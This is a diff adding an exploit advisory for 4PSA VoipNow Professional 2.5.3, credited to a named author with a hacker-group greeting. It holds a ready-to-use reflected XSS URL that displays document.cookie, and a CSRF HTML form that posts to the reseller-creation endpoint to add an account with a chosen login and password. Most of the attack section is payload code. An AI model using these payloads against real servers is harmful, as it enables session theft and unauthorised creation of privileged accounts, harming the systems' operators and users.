@@ -1,0 +1,52 @@
+4PSA VoipNow Professional 2.5.3 Reflected XSS / CSRF (Add Reseller) Vulnerabilities
+==================================================================================
+
+##################################################################################
+.:. Author         :  Aboud-el [aboud_el@hotmail.com]
+.:. Script         : http://www.4psa.com/
+.:. Gr34T$ T0 [AtT4CKxT3rR0r1ST]
+##################################################################################
+
+===[ Exploit ]===
+
+Reflected XSS
+=============
+
+http://SITE/index.php?nsextt='"<script>alert(document.cookie)</script>
+
+
+CSRF (Add Reseller)
+===================
+
+<form method="POST" name="form0" action="http://SITE/content.php?screen=resellers/edit_reseller">
+<input type="hidden" name="edit_reseller_cmd" value="1"/>
+<input type="hidden" name="client_template_id" value="2"/>
+<input type="hidden" name="company" value="....."/>
+<input type="hidden" name="name" value="....."/>
+<input type="hidden" name="login" value="....."/>
+<input type="hidden" name="password" value="....."/>
+<input type="hidden" name="cpassword" value="....."/>
+<input type="hidden" name="phone" value="....."/>
+<input type="hidden" name="fax" value="....."/>
+<input type="hidden" name="email" value="....."/>
+<input type="hidden" name="address" value="....."/>
+<input type="hidden" name="city" value="....."/>
+<input type="hidden" name="pcode" value="00961"/>
+<input type="hidden" name="country_id" value="122"/>
+<input type="hidden" name="region_id" value="2073"/>
+<input type="hidden" name="timezone_id" value="197"/>
+<input type="hidden" name="language" value="en"/>
+<input type="hidden" name="notes" value="....."/>
+<input type="hidden" name="billing_plan_id" value="274"/>
+<input type="hidden" name="charging_identifier" value="....."/>
+</form>
+<form method="GET" name="form1" action="http://SITE/content.php?screen=resellers/resellers&">
+<input type="hidden" name="name" value="value"/> 
+</form>
+
+</body>
+</html>
+
+##################################################################################
+
+ 		 	   		   		 	   		  
